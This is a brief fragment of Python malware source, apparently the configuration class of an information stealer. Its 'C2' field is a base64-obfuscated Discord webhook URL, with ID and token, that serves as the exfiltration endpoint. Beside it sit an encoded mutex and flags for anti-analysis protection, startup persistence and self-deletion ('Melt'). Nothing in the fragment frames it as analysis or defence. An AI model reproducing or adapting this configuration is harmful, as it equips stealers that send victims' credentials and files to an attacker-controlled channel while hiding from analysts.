...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNzg4ODM3NTU0NTY2MzQ4OS9KOE85X1hUZlJBSDJqdUtJN3BOMnBiRXJZYzc4ejRjOVg1UVNzUjlZcGtMekllUU16eUlCaFkwZzJWenN3QzZBUks5Nw==').decode())
    Mutex = base64.b64decode('QThMNzdrWUFsSVhiaG9xRQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
